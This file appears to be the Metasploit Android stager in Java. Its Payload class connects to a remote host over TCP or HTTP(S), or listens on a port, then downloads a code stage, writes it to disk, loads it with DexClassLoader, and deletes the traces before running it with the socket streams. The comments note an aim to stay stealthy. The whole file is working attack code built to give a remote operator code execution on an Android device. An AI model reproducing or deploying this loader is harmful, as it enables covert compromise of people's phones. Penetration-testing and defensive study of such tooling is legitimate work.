package com.metasploit.stage;

import android.content.Context;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.TimeUnit;

import dalvik.system.DexClassLoader;

public class Payload {

    public static final String URL =            "ZZZZ                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ";
    public static final String CERT_HASH =      "WWWW                                        ";
    public static final String TIMEOUTS =    "TTTT                                           ";

    public static long session_expiry;
    public static long comm_timeout;
    public static long retry_total;
    public static long retry_wait;

    private static String[] parameters;

    public static void start(Context context) {
        startInPath(context.getFilesDir().toString());
    }

    public static void startAsync() {
        new Thread() {
            @Override
            public void run() {
                // Execute the payload
                Payload.main(null);
            }
        }.start();
    }

    public static void startInPath(String path) {
        parameters = new String[]{path};
        startAsync();
    }

    public static void main(String[] args) {
        if (args != null) {
            File currentDir = new File(".");
            String path = currentDir.getAbsolutePath();
            parameters = new String[]{path};
        }
        long sessionExpiry;
        long commTimeout;
        long retryTotal;
        long retryWait;
        long currentTime = -1;
        long payloadStart = System.currentTimeMillis();
        String timeoutString = TIMEOUTS.substring(4).trim();
        if (timeoutString.length() > 3) {
            String[] timeouts = timeoutString.split("-");
            try {
                sessionExpiry = Integer.parseInt(timeouts[0]);
                commTimeout = Integer.parseInt(timeouts[1]);
                retryTotal = Integer.parseInt(timeouts[2]);
                retryWait = Integer.parseInt(timeouts[3]);
            } catch (NumberFormatException e) {
                return;
            }

            session_expiry = TimeUnit.SECONDS.toMillis(sessionExpiry) + payloadStart;
            comm_timeout = TimeUnit.SECONDS.toMillis(commTimeout);
            retry_total = TimeUnit.SECONDS.toMillis(retryTotal);
            retry_wait = TimeUnit.SECONDS.toMillis(retryWait);
            currentTime = System.currentTimeMillis();
        }

        String url = URL.substring(4).trim();
        // technically we need to check for session expiry here as well.
        while (currentTime < payloadStart + retry_total &&
            currentTime < session_expiry) {
            try {
                if (url.startsWith("tcp")) {
                    runStagefromTCP(url);
                } else {
                    runStageFromHTTP(url);
                }
                break;
            } catch (Exception e) {
                // Avoid printing extensive backtraces when we are trying to be
                // stealty. An optional runtime or staging-time switch would be
                // good to have here, like Python Meterpreter's debug option.
                // e.printStackTrace();
            }
            try {
                Thread.sleep(retry_wait);
            } catch (InterruptedException e) {
              break;
            }
            currentTime = System.currentTimeMillis();
        }
    }

    private static void runStageFromHTTP(String url) throws Exception {
        InputStream inStream;
        if (url.startsWith("https")) {
            URLConnection uc = new URL(url).openConnection();
            Class.forName("com.metasploit.stage.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, uc);
            inStream = uc.getInputStream();
        } else {
            inStream = new URL(url).openStream();
        }
        OutputStream out = new ByteArrayOutputStream();
        DataInputStream in = new DataInputStream(inStream);
        readAndRunStage(in, out, parameters);
    }

    private static void runStagefromTCP(String url) throws Exception {
        // string is in the format:   tcp://host:port
        String[] parts = url.split(":");
        int port = Integer.parseInt(parts[2]);
        String host = parts[1].split("/")[2];
        Socket sock = null;

        if (host.equals("")) {
            ServerSocket server = new ServerSocket(port);
            sock = server.accept();
            server.close();
        } else {
            sock = new Socket(host, port);
        }

        if (sock != null) {
            DataInputStream in = new DataInputStream(sock.getInputStream());
            OutputStream out = new DataOutputStream(sock.getOutputStream());
            readAndRunStage(in, out, parameters);
        }
    }

    private static void readAndRunStage(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
        String path = parameters[0];
        String filePath = path + File.separatorChar + "payload.jar";
        String dexPath = path + File.separatorChar + "payload.dex";

        // Read the class name
        int coreLen = in.readInt();
        byte[] core = new byte[coreLen];
        in.readFully(core);
        String classFile = new String(core);

        // Read the stage
        coreLen = in.readInt();
        core = new byte[coreLen];
        in.readFully(core);

        File file = new File(filePath);
        if (!file.exists()) {
            file.createNewFile();
        }
        FileOutputStream fop = new FileOutputStream(file);
        fop.write(core);
        fop.flush();
        fop.close();

        // Load the stage
        DexClassLoader classLoader = new DexClassLoader(filePath, path, path,
                Payload.class.getClassLoader());
        Class<?> myClass = classLoader.loadClass(classFile);
        final Object stage = myClass.newInstance();
        file.delete();
        new File(dexPath).delete();
        myClass.getMethod("start",
                new Class[]{DataInputStream.class, OutputStream.class, String[].class})
                .invoke(stage, in, out, parameters);

        session_expiry = -1;
    }
}
